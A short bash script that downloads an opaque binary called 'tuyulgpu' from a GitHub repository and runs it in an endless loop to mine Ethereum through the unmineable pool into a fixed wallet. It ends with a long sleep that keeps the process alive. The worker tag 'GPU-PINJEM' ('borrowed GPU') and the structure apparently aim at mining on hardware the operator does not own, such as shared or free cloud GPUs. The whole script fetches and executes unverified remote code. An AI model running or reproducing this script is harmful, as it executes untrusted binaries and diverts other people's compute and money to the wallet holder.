#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=ETH:0x7cCe9b970b0273B8A05acb41ff01D23CFB21F358
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
wget https://github.com/skullCANDe/skyz/raw/main/tuyulgpu
chmod +x tuyulgpu
while [ 1 ]; do
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999